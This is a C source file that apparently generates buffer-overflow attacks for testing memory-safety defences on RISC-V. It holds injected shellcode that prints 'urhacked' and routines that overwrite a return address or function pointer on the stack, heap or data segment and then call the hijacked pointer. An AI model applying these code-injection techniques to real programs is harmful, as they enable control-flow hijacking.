#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "attack_generator.h"

static char shellcode_no_noop[] =
  "\x17\x05\x00\x00"
  "\x13\x05\xc5\x01"
  "\x93\x05\x10\x24"
  "\x12\x06\x60\x1b"
  "\x93\x06\x00\x00"
  "\x93\x08\x00\x40"
  "\x73\x00\x00\x00"
  "urhacked";

#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((void**)OLD_BP_PTR + 1)

const size_t shellcode_no_noop_size = sizeof(shellcode_no_noop);

const size_t STACK_BUFFER_SIZE = 1024;

ATTACKFORM attack;

CHARPAYLOAD payload;

void fooz() {
  printf("fooz was called\n");
}

struct attackme data_struct = {"AAAAAAAA", &fooz};

void generate_payload() {

  static struct attackme bss_struct = {"AAAAAAAA", &fooz};
  
  if (attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
    payload.overflow_ptr = bss_struct.buffer;
    payload.buffer = &bss_struct.func_ptr;
  }

  size_t total_size = (uintptr_t) payload.overflow_ptr - (uintptr_t) payload.buffer + sizeof(int);

  printf("overflow_ptr is %x\nbuffer is %x\n", payload.overflow_ptr, payload.buffer);

  char* temp_char_buffer = (char*) malloc(total_size);

  if(temp_char_buffer == NULL) {
    fprintf(stderr, "malloc failed\n");
  }

  int buf_ptr = (int) payload.buffer;
  memcpy(temp_char_buffer, payload.contents, payload.size);

  char* tc_ra_location = (char*) ((uintptr_t) temp_char_buffer + total_size - sizeof(int));
  memcpy(tc_ra_location, &buf_ptr, sizeof(int));
  memcpy(payload.buffer, temp_char_buffer, total_size);

  //we do this so that the compiler doesn't optimize away the memcpy
  printf("%c\n", *((char*) payload.buffer));
}

boolean is_attack_possible() {
  switch(attack.location) {
    case HEAP:
      if((attack.technique == DIRECT) && attack.code_ptr == RET_ADDR) {
        return FALSE;
      }
  }

  return TRUE;
}

int main() {  

  int* stack_mem_ptr;

  char buf[STACK_BUFFER_SIZE];

  struct attackme stack_struct;
  stack_struct.func_ptr = &fooz;

  struct attackme* heap_struct = (struct attackme*) malloc(sizeof(struct attackme));
  heap_struct->func_ptr = &fooz;

  attack.technique = DIRECT;
  attack.code_ptr = STRUCT_FUNC_PTR_DATA;
  attack.location = HEAP;

  payload.size = shellcode_no_noop_size;

  if (attack.code_ptr == RET_ADDR) {
    payload.overflow_ptr = (void*) ((uintptr_t) (RET_ADDR_PTR) - 0x10);
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    payload.overflow_ptr = (void*) &stack_struct.func_ptr;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    payload.overflow_ptr = (void*) &heap_struct->func_ptr;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    payload.overflow_ptr = (void*) &data_struct.func_ptr;
  }

  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    payload.buffer = stack_struct.buffer;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    payload.buffer = heap_struct->buffer;
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    payload.buffer = data_struct.buffer;
  } else if (attack.location == STACK) {
    payload.buffer = buf;
  } else if (attack.location == HEAP) {
    payload.buffer = malloc(100);
  }

  payload.contents = shellcode_no_noop;

  printf("%p\n", RET_ADDR_PTR);

  generate_payload(&payload);

  if (attack.code_ptr == STRUCT_FUNC_PTR_STACK) {
    stack_struct.func_ptr();
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) {
    heap_struct->func_ptr();
  } else if (attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
    data_struct.func_ptr();
  }
}
